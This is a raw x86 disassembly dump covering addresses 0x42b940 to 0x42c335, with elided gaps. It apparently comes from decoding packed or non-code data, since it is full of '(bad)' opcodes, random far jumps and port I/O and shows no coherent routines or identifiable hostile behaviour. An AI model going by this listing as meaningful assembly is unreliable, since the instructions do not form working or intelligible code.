  42b940:	sbb    al,0xe7
  42b942:	rol    DWORD PTR [edx],1
  42b944:	es int 0x1
  42b947:	add    ch,dh
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    BYTE PTR ds:0xe42df610,ch
  42b951:	and    al,0xd
  42b953:	jo     0x42b9cd
  42b955:	lahf   
  42b956:	(bad)
  42b95a:	fidivr DWORD PTR [edi+0x78]
  42b95d:	sbb    al,0x45
  42b95f:	xchg   edi,eax
  42b960:	cmp    al,0x14
  42b962:	add    edx,esp
  42b964:	jg     0x42b95a
  42b966:	or     eax,DWORD PTR [edx-0x72]
  42b969:	imul   di,bx,0xa7fb
  42b96e:	int    0x1b
  42b970:	cpuid  
  42b972:	pop    es
  42b973:	iret   
  42b974:	add    edx,DWORD PTR [ebp+0x71e504d]
  42b97a:	ret    0x57ea
  42b97d:	cs scas eax,DWORD PTR es:[edi]
  42b97f:	hlt    
  42b980:	jp     0x42b9bd
  42b982:	mov    al,0x42
  42b984:	shl    BYTE PTR [eax+0x7c854085],0xd2
  42b98b:	aam    0xbf
  42b98d:	stc    
  42b98e:	fisttp QWORD PTR [edx]
  42b990:	(bad)  
  42b991:	neg    DWORD PTR [ebp+0x1a]
  42b994:	mov    esi,0xc996c92e
  42b999:	into   
  42b99a:	inc    edx
  42b99b:	sub    BYTE PTR [ebx],dh
  42b99d:	cli    
  42b99e:	mov    eax,0x526f57d1
  42b9a3:	(bad)  [eax-0x24924bc0]
  42b9a9:	jmp    0x8fd9:0x49eb1c13
  42b9b0:	aas    
  42b9b1:	rol    ch,1
  42b9b3:	ins    DWORD PTR es:[edi],dx
  42b9b4:	push   0xffffffff
  42b9b6:	jge    0x42b93a
  42b9b8:	(bad)  
  42b9b9:	(bad)  
  42b9ba:	xchg   edi,eax
  42b9bb:	sbb    bh,BYTE PTR ds:0x2981a717
  42b9c1:	xor    al,BYTE PTR [edi]
  42b9c3:	xchg   edi,eax
  42b9c4:	pop    edi
  42b9c5:	xlat   BYTE PTR ds:[ebx]
  42b9c6:	sbb    BYTE PTR [esi-0x22dcd637],bh
  42b9cc:	mov    cl,0xad
  42b9ce:	cs aas 
  42b9d0:	into   
  42b9d1:	sbb    eax,0x38049dbb
  42b9d6:	lock scas al,BYTE PTR es:[edi]
  42b9d8:	pop    ss
  42b9d9:	mov    al,0xe9
  42b9db:	sbb    DWORD PTR [ebp+0x19256060],edx
  42b9e1:	mov    edi,0x6afce39f
  42b9e6:	cdq    
  42b9e7:	sbb    al,0xc4
  42b9e9:	gs jle 0x42b995
  42b9ec:	repnz push ss
  42b9ee:	adc    DWORD PTR [esi-0xe5ba77d],0xffffff9d
  42b9f5:	ret    
  42b9f6:	add    BYTE PTR [ecx-0x72481b5e],0x6a
  42b9fd:	rcl    eax,cl
  42b9ff:	inc    edi
  42ba00:	fst    DWORD PTR [ebx-0x30]
  42ba03:	cmc    
  42ba04:	pop    esi
  42ba05:	jl     0x42b9c2
  42ba07:	sahf   
  42ba08:	jge    0x42ba88
  42ba0a:	cwde   
  42ba0b:	fild   QWORD PTR ss:[eax+0x64919169]
  42ba12:	leave  
  42ba13:	(bad)
  42ba18:	dec    esp
  42ba19:	jae    0x42ba02
  42ba1b:	mov    edx,0xedefae1b
  42ba20:	nop
  42ba21:	sub    al,0x7b
  42ba23:	pushf  
  42ba24:	push   es
  42ba25:	fwait
  42ba26:	jl     0x42b9b1
  42ba28:	sub    bl,ch
  42ba2a:	and    al,0x63
  42ba2c:	xor    BYTE PTR ds:0x2d42e87e,ah
  42ba32:	fstp   QWORD PTR [esi+0x5d1345bd]
  42ba38:	pusha  
  42ba39:	mov    ebx,0xc76b9cad
  42ba3e:	pop    ebx
  42ba3f:	inc    edx
  42ba40:	jno    0x42ba42
	...
  42bab2:	add    BYTE PTR [eax],al
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi-0x14edbcb4]
  42bac2:	mov    bh,0xce
  42bac4:	sbb    ecx,esi
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [ecx-0x7d],bl
  42bace:	xchg   esi,eax
  42bacf:	or     DWORD PTR [ebx],0xfed15010
  42bad5:	fild   DWORD PTR [ecx-0xe46abce]
  42badb:	aaa    
  42badc:	xchg   ebx,eax
  42badd:	jecxz  0x42ba9a
  42badf:	push   edi
  42bae0:	repnz adc al,0xf1
  42bae3:	sbb    BYTE PTR [esp+eax*8+0x40],bl
  42bae7:	xor    ax,0xd837
  42baeb:	xchg   edi,eax
  42baec:	mov    eax,ds:0xd6a15721
  42baf1:	(bad)  
  42baf2:	fs dec ecx
  42baf4:	clc    
  42baf5:	or     DWORD PTR ds:0x4c5c3214,ebp
  42bafb:	pop    ecx
  42bafc:	add    bh,bh
  42bafe:	pop    ss
  42baff:	xor    al,0xd4
  42bb01:	mov    eax,0xa54305fa
  42bb06:	clc    
  42bb07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bb08:	mov    ds:0x7af95928,eax
  42bb0d:	div    ecx
  42bb0f:	sar    DWORD PTR [esi],0xc0
  42bb12:	in     eax,dx
  42bb13:	in     al,dx
  42bb14:	sbb    BYTE PTR [edx-0x6e24e9a9],al
  42bb1a:	in     al,dx
  42bb1b:	rol    BYTE PTR [ecx+0x50],0x1f
  42bb1f:	ret    0x1966
  42bb22:	inc    esp
  42bb23:	push   ebx
  42bb24:	jle    0x42bb91
  42bb26:	mov    ebx,0x5b316b54
  42bb2b:	push   es
  42bb2c:	shl    DWORD PTR [edi-0x3c7318b5],0xbb
  42bb33:	(bad)  
  42bb34:	data16 sahf 
  42bb36:	mov    ecx,0x7f65d919
  42bb3b:	add    al,0x8e
  42bb3d:	test   DWORD PTR [esi],esp
  42bb3f:	ins    DWORD PTR es:[edi],dx
  42bb40:	jns    0x8cbd5415
  42bb46:	fs test eax,0x65d89776
  42bb4c:	or     dh,BYTE PTR [edx-0x58]
  42bb4f:	dec    ecx
  42bb50:	mov    dl,BYTE PTR [edx-0x18570af6]
  42bb56:	xor    dh,BYTE PTR [ebx]
  42bb58:	popf   
  42bb59:	aam    0xae
  42bb5b:	ins    DWORD PTR es:[edi],dx
  42bb5c:	hlt    
  42bb5d:	jne    0x42bb6c
  42bb5f:	ins    DWORD PTR es:[edi],dx
  42bb60:	(bad)  
  42bb61:	je     0x42bbbb
  42bb63:	cwde   
  42bb64:	sbb    si,WORD PTR [ecx]
  42bb67:	aas    
  42bb68:	fisubr WORD PTR [edi]
  42bb6a:	cmp    eax,DWORD PTR [ecx+0x77]
  42bb6d:	sub    eax,0x5f4dd22d
  42bb72:	inc    esp
  42bb73:	leave  
  42bb74:	(bad)  
  42bb75:	lods   al,BYTE PTR ds:[esi]
  42bb76:	les    edi,FWORD PTR [ecx]
  42bb78:	div    BYTE PTR [edx+0x1f]
  42bb7b:	fstp   TBYTE PTR [ecx-0x66374fd1]
  42bb81:	lea    eax,[ebx+0x76397977]
  42bb87:	sbb    eax,0x55293cd1
  42bb8c:	mov    bh,0x1a
  42bb8e:	lds    ebp,FWORD PTR [edi]
  42bb90:	popf   
  42bb91:	pop    ss
  42bb92:	aaa    
  42bb93:	(bad)  
  42bb94:	cmp    eax,0x9e3ff2d7
  42bb99:	call   0xf0a2d408
  42bb9e:	clc    
  42bb9f:	push   ss
  42bba0:	in     eax,dx
  42bba1:	leave  
  42bba2:	leave  
  42bba3:	imul   ecx,DWORD PTR [edx],0x82abf916
  42bba9:	mov    ds:0x7f4a3974,eax
  42bbae:	pop    ebx
  42bbaf:	mov    dl,0x8e
  42bbb1:	daa    
  42bbb2:	imul   ebx,DWORD PTR [edx+0x39],0x16
  42bbb6:	ror    BYTE PTR [edx],cl
  42bbb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bbb9:	icebp  
  42bbba:	cmp    BYTE PTR [edx+0xd],al
  42bbbd:	(bad)  
  42bbbe:	call   DWORD PTR [edi+ecx*8]
	...
  42bc31:	add    BYTE PTR [eax],al
  42bc33:	add    cl,ch
  42bc35:	xor    bl,BYTE PTR [edx+edi*1]
  42bc38:	fistp  QWORD PTR [esi]
  42bc3a:	out    dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x8e
  42bc41:	(bad)  [edx]
  42bc43:	in     al,dx
  42bc44:	adc    bh,cl
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [ecx+0x64],dl
  42bc4e:	iret   
  42bc4f:	pop    es
  42bc50:	shl    DWORD PTR [esp+esi*8-0x15c74d91],cl
  42bc57:	mov    dl,0x29
  42bc59:	int    0xfc
  42bc5b:	adc    ebp,DWORD PTR [ecx+0x70]
  42bc5e:	lods   eax,DWORD PTR ds:[esi]
  42bc5f:	test   al,0xe5
  42bc61:	je     0x42bc57
  42bc63:	popf   
  42bc64:	test   al,0x9c
  42bc66:	nop
  42bc67:	mov    ebx,0x1479026b
  42bc6c:	add    eax,0x58cdda1b
  42bc71:	cld    
  42bc72:	stos   DWORD PTR es:[edi],eax
  42bc73:	mov    esp,0xc8687595
  42bc78:	sti    
  42bc79:	out    dx,al
  42bc7a:	jmp    0x2bebd7a9
  42bc7f:	and    al,0xd5
  42bc81:	jbe    0x42bccf
  42bc83:	fldl2t 
  42bc85:	cwde   
  42bc86:	xor    eax,0xd316bbc7
  42bc8b:	push   es
  42bc8c:	adc    dl,BYTE PTR [edi+0x5f]
  42bc8f:	and    esp,DWORD PTR [edx]
  42bc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc92:	pop    ecx
  42bc93:	je     0x42bce6
  42bc95:	push   0xffffffbc
  42bc97:	jo     0x42bcba
  42bc99:	mov    al,ds:0xe90e8a23
  42bc9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc9f:	inc    esi
  42bca0:	dec    BYTE PTR [eax]
  42bca2:	adc    ebx,ebx
  42bca4:	mov    ch,0xef
  42bca6:	sub    DWORD PTR [ecx+esi*2],edi
  42bca9:	or     al,0xb
  42bcab:	jle    0x42bc67
  42bcad:	adc    al,BYTE PTR [ecx-0x27]
  42bcb0:	outs   dx,BYTE PTR ds:[esi]
  42bcb1:	lahf   
  42bcb2:	pop    ebp
  42bcb3:	retf   
  42bcb4:	mov    dl,0x11
  42bcb6:	jo     0x42bc7d
  42bcb8:	adc    ch,BYTE PTR [ecx-0xa]
  42bcbb:	mov    bl,BYTE PTR [ebp-0x6c00de2a]
  42bcc1:	fst    QWORD PTR [ebp+0x73]
  42bcc4:	cli    
  42bcc5:	inc    esi
  42bcc6:	jmp    0xa417e2f3
  42bccb:	ror    DWORD PTR [eax-0x5a],0xf2
  42bccf:	lock xchg esp,eax
  42bcd1:	mov    ebx,0x7ad66d2e
  42bcd6:	pop    esi
  42bcd7:	sbb    eax,0xb65c9031
  42bcdc:	pop    eax
  42bcdd:	xchg   esp,eax
  42bcde:	push   ss
  42bcdf:	lds    ebx,FWORD PTR [ebx-0x5c]
  42bce2:	iret   
  42bce3:	jns    0x42bc6e
  42bce5:	scas   al,BYTE PTR es:[edi]
  42bce6:	cmp    al,0xca
  42bce8:	inc    esi
  42bce9:	(bad)  
  42bcea:	(bad)  
  42bceb:	xlat   BYTE PTR ds:[ebx]
  42bcec:	les    edx,FWORD PTR [edi+0x71]
  42bcef:	add    BYTE PTR [ebx+0x21],bl
  42bcf2:	or     al,0x3a
  42bcf4:	into   
  42bcf5:	push   eax
  42bcf6:	jmp    0x47fcc49b
  42bcfb:	repz pop esi
  42bcfd:	in     eax,dx
  42bcfe:	sub    al,al
  42bd00:	jae    0x42bced
  42bd02:	mov    bh,0x0
  42bd04:	les    ebx,FWORD PTR [esi+0x68]
  42bd07:	ins    DWORD PTR es:[edi],dx
  42bd08:	push   ecx
  42bd09:	xor    al,0x6f
  42bd0b:	push   edx
  42bd0c:	sub    bh,BYTE PTR [edi+0x17]
  42bd0f:	mov    ds:0x84efead4,eax
  42bd14:	mov    ch,0xc4
  42bd16:	mov    DWORD PTR [esi+0x2f],ebp
  42bd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd1a:	xor    esi,edx
  42bd1c:	retf   
  42bd1d:	pushf  
  42bd1e:	mov    esp,0x729bcbbb
  42bd23:	adc    BYTE PTR [edi],dh
  42bd25:	dec    eax
  42bd26:	test   DWORD PTR [ecx],0xad476237
  42bd2c:	outs   dx,DWORD PTR ds:[esi]
  42bd2d:	loop   0x42bd25
  42bd2f:	out    0xbf,al
  42bd31:	cld    
  42bd32:	pop    edi
  42bd33:	repz xor eax,0x391adfdf
  42bd39:	xchg   ecx,eax
  42bd3a:	mov    gs:0x444d26cc,eax
  42bd40:	mov    edi,0x0
	...
  42bdb1:	add    BYTE PTR [eax],al
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	cld    
  42bdc1:	(bad)  
  42bdc2:	xchg   esp,eax
  42bdc3:	pop    ebp
  42bdc4:	add    eax,0xf50001d0
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [edx],al
  42bdcd:	leave  
  42bdce:	and    BYTE PTR [esi+0x22],cl
  42bdd1:	fs adc edx,esp
  42bdd4:	xchg   esi,eax
  42bdd5:	or     eax,0xc210d92f
  42bdda:	call   0xdc71e112
  42bddf:	mov    esp,0x87da0566
  42bde4:	sbb    eax,0xaa4b2c74
  42bde9:	jmp    0xf0c86e32
  42bdee:	ret    0xde7e
  42bdf1:	sbb    ebx,ebx
  42bdf3:	push   ecx
  42bdf4:	lods   al,BYTE PTR ds:[esi]
  42bdf5:	daa    
  42bdf6:	ds icebp 
  42bdf8:	and    BYTE PTR ss:[edx],0x6e
  42bdfc:	gs int3 
  42bdfe:	idiv   bh
  42be00:	rcl    DWORD PTR [ebx-0x79bd3b8a],0xf6
  42be07:	stos   DWORD PTR es:[edi],eax
  42be08:	mov    cl,0x18
  42be0a:	xor    bl,BYTE PTR [edx-0x7adb37a8]
  42be10:	fisttp DWORD PTR [ebx-0x3af1b7a2]
  42be16:	rcr    DWORD PTR [ebx+0x76f4fe4e],1
  42be1c:	add    eax,DWORD PTR [eax]
  42be1e:	shl    ah,cl
  42be20:	inc    edi
  42be21:	ficom  WORD PTR ds:0x72635dcd
  42be27:	lock mov edx,0x4c53dfa0
  42be2d:	sub    dh,BYTE PTR gs:[edx+0x2310fb83]
  42be34:	sub    BYTE PTR [ecx-0x7e0cfb7f],cl
  42be3a:	in     eax,dx
  42be3b:	adc    dl,BYTE PTR [esi]
  42be3d:	mov    bl,0x85
  42be3f:	ds out dx,al
  42be41:	iret   
  42be42:	hlt    
  42be43:	xchg   ebp,eax
  42be44:	mov    ds:0xb3519f68,al
  42be49:	mov    ds:0x3beb1e2c,al
  42be4e:	stos   BYTE PTR es:[edi],al
  42be4f:	ret    0x594a
  42be52:	and    DWORD PTR [eax],edi
  42be54:	loop   0x42bed0
  42be56:	sbb    DWORD PTR [edi-0x27],edi
  42be59:	inc    edx
  42be5a:	loopne 0x42be94
  42be5c:	pop    ebp
  42be5d:	add    BYTE PTR [ecx+0x51],0xbc
  42be61:	jb     0x42bdef
  42be63:	scas   al,BYTE PTR es:[edi]
  42be64:	cmp    BYTE PTR [eax+ecx*4-0x642e9324],bh
  42be6b:	out    dx,eax
  42be6c:	inc    ecx
  42be6d:	ins    BYTE PTR es:[edi],dx
  42be6e:	push   esp
  42be6f:	adc    DWORD PTR [edi+0x375967ba],ecx
  42be75:	in     eax,dx
  42be76:	jb     0x42be70
  42be78:	cmp    DWORD PTR [eax-0x1c6d1915],esp
  42be7e:	test   al,0xcd
  42be80:	pop    edi
  42be81:	dec    ecx
  42be82:	mov    edx,0xe9471c00
  42be87:	imul   DWORD PTR [edx+0x298601cb]
  42be8d:	adc    BYTE PTR [ebx+0x2e6dc29e],dl
  42be93:	dec    esp
  42be94:	mov    DWORD PTR [edi+0x47],eax
  42be97:	ja     0x42befc
  42be99:	hlt    
  42be9a:	jp     0x42beca
  42be9c:	out    0x9d,eax
  42be9e:	inc    edi
  42be9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bea0:	sub    ch,BYTE PTR [eax]
  42bea2:	sub    BYTE PTR [ebx+0x4a],al
  42bea5:	cmp    al,0xb
  42bea7:	push   ss
  42bea8:	imul   ebx,DWORD PTR [edi+0x4c],0x1e143c22
  42beaf:	enter  0x3bfe,0x95
  42beb3:	and    bl,BYTE PTR ss:[edx]
  42beb6:	enter  0x73a9,0x34
  42beba:	or     al,BYTE PTR [edx]
  42bebc:	mov    eax,ds:0x7a17a6ce
	...
  42bf31:	add    BYTE PTR [eax],al
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	call   0xfafa6fc0
  42bf45:	rol    BYTE PTR [ecx],1
  42bf47:	add    ch,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [esi],dh
  42bf4d:	outs   dx,BYTE PTR ds:[esi]
  42bf4e:	jno    0x42bfb4
  42bf50:	call   0xeb8b:0x4f4e34ad
  42bf57:	mov    BYTE PTR [ecx-0x5f],dl
  42bf5a:	repnz mov ebx,0xb959ed48
  42bf60:	mov    BYTE PTR ds:0x4e7b3100,bl
  42bf66:	add    eax,0x745aeaf5
  42bf6b:	inc    esi
  42bf6c:	out    dx,eax
  42bf6d:	pop    ebx
  42bf6e:	jecxz  0x42bfbe
  42bf70:	ja     0x42bfca
  42bf72:	adc    ebp,ebp
  42bf74:	cwde   
  42bf75:	push   ebp
  42bf76:	mov    cl,BYTE PTR [ebx]
  42bf78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf79:	pop    ecx
  42bf7a:	or     dh,al
  42bf7c:	stos   DWORD PTR es:[edi],eax
  42bf7d:	stos   BYTE PTR es:[edi],al
  42bf7e:	jge    0x42bf14
  42bf80:	mov    dh,0xe9
  42bf82:	pop    ss
  42bf83:	pop    esp
  42bf84:	call   0xc9ce:0x9bbc5b66
  42bf8b:	loope  0x42bf27
  42bf8d:	adc    al,0xd5
  42bf8f:	xor    al,0x4
  42bf91:	lock xchg BYTE PTR ds:0xb24bde10,ah
  42bf98:	sbb    BYTE PTR ds:0xfa37aea8,ah
  42bf9e:	paddq  mm3,QWORD PTR [ebx-0x610f2457]
  42bfa5:	clc    
  42bfa6:	out    0xcc,al
  42bfa8:	dec    eax
  42bfa9:	call   0x70993d51
  42bfae:	sub    BYTE PTR [esi+0x7f],bl
  42bfb1:	sub    ch,BYTE PTR [edi-0x7c]
  42bfb4:	and    dh,cl
  42bfb6:	xchg   BYTE PTR [esi+eax*8+0x35],al
  42bfba:	pop    ecx
  42bfbb:	call   0xcc3b:0xce4b0f9b
  42bfc2:	(bad)  
  42bfc5:	int3   
  42bfc6:	push   esp
  42bfc7:	stos   DWORD PTR es:[edi],eax
  42bfc8:	shl    edi,0x3a
  42bfcb:	pop    esi
  42bfcc:	hlt    
  42bfcd:	jne    0x42c000
  42bfcf:	push   ss
  42bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfd1:	leave  
  42bfd2:	test   al,0xa4
  42bfd4:	mov    BYTE PTR [esi],bh
  42bfd6:	inc    esp
  42bfd7:	pop    esi
  42bfd8:	inc    DWORD PTR [edi-0x54]
  42bfdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfdd:	cmp    BYTE PTR [esi],dh
  42bfdf:	jecxz  0x42c046
  42bfe1:	dec    ebp
  42bfe2:	mov    eax,ds:0x3c0f57a5
  42bfe7:	int    0xeb
  42bfe9:	adc    ah,bl
  42bfeb:	jo     0x42bfdf
  42bfed:	(bad)  
  42bfee:	xlat   BYTE PTR ds:[ebx]
  42bfef:	and    eax,0x29e65758
  42bff4:	mov    ebx,ss
  42bff6:	cs mov edi,edi
  42bff9:	test   al,0x22
  42bffb:	shr    BYTE PTR [esi+ecx*2+0x4f],cl
  42bfff:	ins    BYTE PTR es:[edi],dx
  42c000:	stc    
  42c001:	xchg   esp,eax
  42c002:	jmp    0xe8f3:0xc916c05a
  42c009:	mov    al,ds:0x374d5954
  42c00e:	and    BYTE PTR [eax],bh
  42c010:	cld    
  42c011:	mov    dl,0xe0
  42c013:	jl     0x42bfcb
  42c015:	loopne 0x42c065
  42c017:	adc    edx,DWORD PTR [edx-0x39581fee]
  42c01d:	pop    edi
  42c01e:	aad    0x56
  42c020:	jmp    0x42bfb0
  42c022:	fidiv  DWORD PTR [edi+0x13]
  42c025:	sahf   
  42c026:	mov    al,ds:0xaf51116
  42c02b:	movzx  esi,WORD PTR [ecx-0x11]
  42c02f:	test   BYTE PTR [ecx+0x12ab50b1],ch
  42c035:	jne    0x42c08b
  42c037:	mov    esi,0x3f428843
  42c03c:	or     eax,0x4c228745
	...
  42c0b1:	add    BYTE PTR [eax],al
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0x25942915
  42c0c1:	gs xor esi,edx
  42c0c4:	out    dx,eax
  42c0c5:	rol    DWORD PTR [ecx],1
  42c0c7:	add    ch,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    BYTE PTR [edi+0x71941b1a],ch
  42c0d1:	addr16 jb 0x42c13e
  42c0d4:	mov    ds:0xaa2de0b6,al
  42c0d9:	xor    ebp,ebx
  42c0db:	call   0x5ed7a8c6
  42c0e0:	xchg   esp,eax
  42c0e1:	mov    eax,ds:0x619c6c6c
  42c0e6:	cmp    eax,0x1d96576a
  42c0eb:	pop    es
  42c0ec:	inc    edx
  42c0ed:	or     DWORD PTR [eax+0x50],0x1f
  42c0f1:	push   0x64
  42c0f3:	cmp    DWORD PTR [ebp-0x1fcaea19],eax
  42c0f9:	sar    BYTE PTR [ebx+0x51],cl
  42c0fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0fd:	(bad)  
  42c0fe:	in     eax,0x8
  42c100:	ret    
  42c101:	(bad)  
  42c102:	mov    esi,0x1b0f94d6
  42c107:	sti    
  42c108:	inc    ecx
  42c109:	fdiv   DWORD PTR cs:[eax-0x65]
  42c10d:	lods   eax,DWORD PTR ds:[esi]
  42c10e:	jno    0x42c0b1
  42c110:	cmc    
  42c111:	ret    0xded3
  42c114:	push   edi
  42c115:	sub    DWORD PTR [eax-0x31],ebp
  42c118:	jbe    0x42c0db
  42c11a:	sar    DWORD PTR [ebx+0x4d296cd3],cl
  42c120:	repnz sti 
  42c122:	xchg   edx,eax
  42c123:	loope  0x42c154
  42c125:	inc    ecx
  42c126:	pop    esp
  42c127:	xor    al,BYTE PTR [edx]
  42c129:	retf   
  42c12a:	or     BYTE PTR [ebx-0x41],ch
  42c12d:	jg     0x42c0af
  42c12f:	shl    bl,cl
  42c131:	or     al,0x18
  42c133:	xlat   BYTE PTR ds:[ebx]
  42c134:	xchg   esi,eax
  42c135:	xor    dh,BYTE PTR [esi-0x1d2dca91]
  42c13b:	hlt    
  42c13c:	and    cl,BYTE PTR [edx]
  42c13e:	cmp    ebx,DWORD PTR [eax]
  42c140:	pop    ebp
  42c141:	cli    
  42c142:	mov    ebx,0x36b2c4aa
  42c147:	xchg   edi,eax
  42c148:	lods   eax,DWORD PTR ds:[esi]
  42c149:	jnp    0x42c12a
  42c14b:	push   ds
  42c14c:	push   edx
  42c14d:	out    0xd9,eax
  42c14f:	and    al,0x2e
  42c151:	inc    ecx
  42c152:	aaa    
  42c153:	push   cs
  42c154:	out    dx,eax
  42c155:	dec    ebx
  42c156:	push   ebp
  42c157:	pop    eax
  42c158:	jge    0x42c0e0
  42c15a:	jecxz  0x42c1c8
  42c15c:	mov    ebp,0x589add7e
  42c161:	in     al,dx
  42c162:	mul    DWORD PTR [ebx+ebx*8]
  42c165:	neg    DWORD PTR [ebx]
  42c167:	mov    DWORD PTR [eax],ecx
  42c169:	push   esi
  42c16a:	push   eax
  42c16b:	cwde   
  42c16c:	mov    ds:0x1361a63a,al
  42c171:	imul   eax,ebx,0x4020736b
  42c177:	fsubrp st(5),st
  42c179:	test   al,0x39
  42c17b:	mov    eax,ds:0xea0f1c0d
  42c180:	xchg   esi,eax
  42c181:	mov    edx,0xbd3f879
  42c186:	test   BYTE PTR [ebx],bl
  42c188:	xor    ecx,DWORD PTR [ecx-0x1f]
  42c18b:	mov    WORD PTR ds:0xaed5f62b,gs
  42c191:	lods   al,BYTE PTR fs:[esi]
  42c193:	gs add al,0xd0
  42c196:	(bad)  
  42c198:	and    eax,0xe82d99c7
  42c19d:	sbb    cl,BYTE PTR [edi+0x316053ca]
  42c1a3:	adc    al,0x76
  42c1a5:	stc    
  42c1a6:	sub    edx,DWORD PTR [esi-0x2fa2efdb]
  42c1ac:	js     0x42c14e
  42c1ae:	fnstsw WORD PTR [esi+edi*4]
  42c1b1:	sub    al,0x80
  42c1b3:	outs   dx,BYTE PTR ds:[esi]
  42c1b4:	mov    edx,0x9bbc2e46
  42c1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1ba:	push   ebx
  42c1bb:	lea    edi,[eax]
  42c1bd:	or     edi,DWORD PTR [esp+ebx*2-0x1]
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1-0x3e]
  42c241:	scas   eax,DWORD PTR es:[edi]
  42c242:	inc    ebp
  42c243:	and    ah,ah
  42c245:	rol    BYTE PTR [ecx],cl
  42c247:	add    ch,dh
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ebp+0x6a],dl
  42c24e:	jne    0x42c289
  42c250:	xchg   ecx,eax
  42c251:	dec    esp
  42c252:	push   ecx
  42c253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c254:	and    eax,0xca88e744
  42c259:	enter  0x71cb,0xd
  42c25d:	xor    ebx,edx
  42c25f:	and    BYTE PTR [ebp-0x408799b6],cl
  42c265:	jl     0x42c27b
  42c267:	mov    ecx,0x1351ea6d
  42c26c:	rcl    dh,1
  42c26e:	inc    ebp
  42c26f:	jmp    0xe2d1:0x27859ba3
  42c276:	xor    esp,DWORD PTR ds:0x7fdc4571
  42c27c:	not    BYTE PTR [ecx+0x26c1e1d5]
  42c282:	sbb    DWORD PTR [ebp+0x7815fde7],eax
  42c288:	lods   al,BYTE PTR ds:[esi]
  42c289:	bound  ebp,QWORD PTR [ecx+ebp*2-0x3a2334cc]
  42c290:	(bad)  
  42c291:	ins    BYTE PTR es:[edi],dx
  42c292:	pop    esp
  42c293:	in     eax,0x8e
  42c295:	sub    ch,BYTE PTR [ebx-0x4a663ed8]
  42c29b:	icebp  
  42c29c:	pop    ss
  42c29d:	test   eax,0x1ce9a6ad
  42c2a2:	dec    esp
  42c2a3:	and    eax,0xc67fe298
  42c2a8:	inc    esi
  42c2a9:	pop    edx
  42c2aa:	mov    dl,0xd6
  42c2ac:	call   0x9eed:0x807b9615
  42c2b3:	retf   
  42c2b4:	or     esi,DWORD PTR [edi]
  42c2b6:	xchg   esi,eax
  42c2b7:	mov    al,BYTE PTR [esi]
  42c2b9:	sub    eax,0x94a450e7
  42c2be:	ror    DWORD PTR [eax+edx*4-0x3d997904],0xbb
  42c2c6:	jns    0x42c331
  42c2c8:	retf   
  42c2c9:	(bad)
  42c2cc:	adc    dh,BYTE PTR [ebx-0x5a1d4c6f]
  42c2d2:	shl    BYTE PTR [ecx+0x72f8a4af],0x7c
  42c2d9:	push   ebp
  42c2da:	mov    WORD PTR [edi-0x44],?
  42c2dd:	fidiv  WORD PTR [ecx+0x5f5fba87]
  42c2e3:	xor    esp,DWORD PTR [ebx+0x6c]
  42c2e6:	dec    esp
  42c2e7:	push   0x41
  42c2e9:	out    0x7b,al
  42c2eb:	mov    edi,0x8b90ce9e
  42c2f0:	mov    bh,0x91
  42c2f2:	inc    ebx
  42c2f3:	sub    al,0x8e
  42c2f5:	arpl   WORD PTR ds:0x4f8e88dd,di
  42c2fb:	int    0x9f
  42c2fd:	lahf   
  42c2fe:	and    eax,0x217aa0ec
  42c303:	and    al,0xb1
  42c305:	inc    ebp
  42c306:	pop    eax
  42c307:	pop    esp
  42c308:	inc    edi
  42c309:	and    ecx,DWORD PTR [edx+0x7]
  42c30c:	jp     0x42c2c1
  42c30e:	adc    ch,BYTE PTR [edx+0x4b5556f0]
  42c314:	mov    ds,WORD PTR [edx+0x8]
  42c317:	pop    edi
  42c318:	shr    BYTE PTR [ebx-0x480126a9],1
  42c31e:	add    BYTE PTR [edi+0x64],bl
  42c321:	gs jbe 0x42c38b
  42c324:	fdivr  QWORD PTR [ebp-0x39]
  42c327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c328:	test   al,0x39
  42c32a:	jecxz  0x42c2d6
  42c32c:	jo     0x42c305
  42c32e:	inc    ebx
  42c32f:	mov    ebp,0x849b8a5b
  42c334:	pop    ebp
  42c335:	(bad)  
